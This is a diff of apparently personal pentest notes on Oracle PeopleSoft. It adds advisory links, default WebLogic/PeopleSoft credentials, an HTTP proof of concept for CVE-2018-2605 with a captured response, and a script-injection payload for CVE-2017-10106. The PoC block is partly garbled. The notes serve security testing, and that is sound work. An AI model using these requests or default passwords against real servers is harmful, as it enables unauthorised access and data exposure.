@@ -4,10 +4,29 @@
 - [exploit-db CVE-2017-10366][RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56](https://www.exploit-db.com/exploits/43594)
 - [exploit-db CVE-2017-3548]['PeopleSoftServiceListeningConnector' XML External Entity via DOCTYPE in PeopleSoft 8.55](https://www.exploit-db.com/exploits/41925)
 - [exploit-db CVE-2017-3546][SSRF in PeopleSoft 8.55 IMServlet ](https://www.exploit-db.com/exploits/42034)
+- [[CVE-2017-10146] Directory Traversal and Authentication Bypass by Double encode in Portal of PeopleSoft 8.54, 8.55](https://erpscan.io/advisories/erpscan-17-040-anonymous-directory-traversal-vulnerability-double-encode-peoplesoft/)
+- [[CVE-2017-10061] Directory Traversal and File Upload leading to RCE of PeopleSoft 8.54, 8.55](https://erpscan.io/advisories/erpscan-17-038-directory-traversal-vulnerability-integration-gateway-psigw/)
+- https://erpscan.io/advisories/erpscan-18-001-information-disclosure-peoplesoft-listening-connector/
+- https://erpscan.io/advisories/erpscan-17-039-file-upload-integration-gateway-psigw-peoplesoft/
+- https://erpscan.io/advisories/erpscan-17-042-anonymous-log-injection-in-fscm/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-10-logging-security-events/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-9-insecure-trusted-connections/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-8-access-control-sod-conflicts/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-6-insecure-settings/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-5-open-remote-management-interfaces/
+- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-4-unnecessary-functionality/
+- https://erpscan.io/press-center/blog/peoplesoft-security-part-2-decrypting-accessid/
+- https://erpscan.io/press-center/blog/peoplesoft-security-part-3-peoplesoft-sso-tokenchpoken-attack/
+- https://erpscan.io/press-center/blog/peoplesoft-security-part-4-peoplesoft-pentest-using-tokenchpoken-tool/
+- https://erpscan.io/advisories/erpscan-17-023-crlf-injection-peoplesoft-imservlet/
+- https://erpscan.io/press-center/blog/peoplesoft-security-configuration-part-2-patch-management/
+- 
+- https://www.oracle.com/security-alerts/cpujul2017.html
 - https://github.com/blazeinfosec/CVE-2017-10366_peoplesoft
 - [Oracle PeopleSoft applications are under attacks!](https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T2-Alexey-Tiurin-Oracle-Peoplesoft-Applications-are-Under-Attack.pdf)
 - https://erpscan.io/advisories/erpscan-17-020-xxe-via-doctype-peoplesoft/
 - https://erpscan.io/advisories/erpscan-17-022-ssrf-peoplesoft-imservlet/
+- [PeopleSoft Security. Part 1: Overview of architecture](https://erpscan.io/press-center/blog/peoplesoft-security-part-1-overview-of-architecture/)
 
 
 
@@ -25,6 +44,26 @@
 ### 杂
 - 获取版本号：`/PSEMHUB/hub`
 - 找到site name/ID: `/`，匹配其结果`<a href="../ps/signon.html">`，这里就是`ps`
+
+```
+Human Resource Management Systems (HRMS)
+Financial Management Solutions (FMS)
+Supply Chain Management (SCM)
+customer relationship management (CRM)
+Enterprise Performance Management software (EPM)
+```
+
+>  PeopleSoft applications are quite complex and multi-component. Logically, their
+security is not a simple thing either. 
+
+Ref: 
+- https://erpscan.io/wp-content/uploads/2017/10/Hack-and-Defense-Oracle-PeopleSoft-Security-Overview.pdf
+
+### Attacks via WebLogic
+> PS is usually installed together with the WebLogic application server. And this is how the system is accessible from the Internet.
+
+>  WL + PS have several default user accounts: “system”, “operator”, “monitor”. The password is usually “password” or “Passw0rd”
+
 
 ### PoC
 ```
@@ -89,6 +128,46 @@ Cookie:a=aa
 
 %SITE_NAME% - is a PeopleSoft "name" to get it you can use some information
 ```
+
+#### [CVE-2018-2605] Information Disclosure of PeopleSoft 8.54, 8.55, 8.56
+```http
+
+POST http://<PEOPLESOFT_HOST>:8000/PSIGW/PeopleSoftListeningConnector
+Content-Type: application/json
+1
+2
+POST http://<PEOPLESOFT_HOST>:8000/PSIGW/PeopleSoftListeningConnector
+Content-Type: application/json
+-- response --
+ 
+200 OK
+Date: Fri, 16 Jun 2017 11:34:07 GMT
+Content-Length: 675
+Content-Type: text/plain; charset=UTF-8
+Message-ID: 1133584668.1497612847565.JavaMail.Administrator@psfthcmwin <--!!! INFORMATION DISCLOSE
+Date: Fri, 16 Jun 2017 04:34:07 -0700 (PDT)
+Mime-Version: 1.0
+Content-Type: multipart/related; 
+boundary="----=_Part_95_86951755.1497612847564"
+Content-ID: PeopleSoft-Integration-Broker-Internal-Mime-Message
+------=_Part_95_86951755.1497612847564
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+Content-Disposition: inline
+Content-ID: IBInfo
+<?xml version="1.0"?>2015810408Integration Gateway Error
+------=_Part_95_86951755.1497612847564--
+
+```
+
+#### [CVE-2017-10106] XSS of PeopleTools 8.54, 8.55
+```
+POST    /pspc/test?userID=<script>alert(1)</script>&password=<script>alert(2)</script>&languageCode==<script>alert(5)</script>&siteName=<script>alert(3)</script>&CREFName=<script>alert(4)</script>&portalName=<script>alert(6)</script>&command=login HTTP/1.1
+
+```
+
+ref: 
+- https://erpscan.io/advisories/erpscan-17-037-multiple-xss-vulnerabilities-testservlet-peoplesoft/
 
 #### 直接部署Service
 ```bash
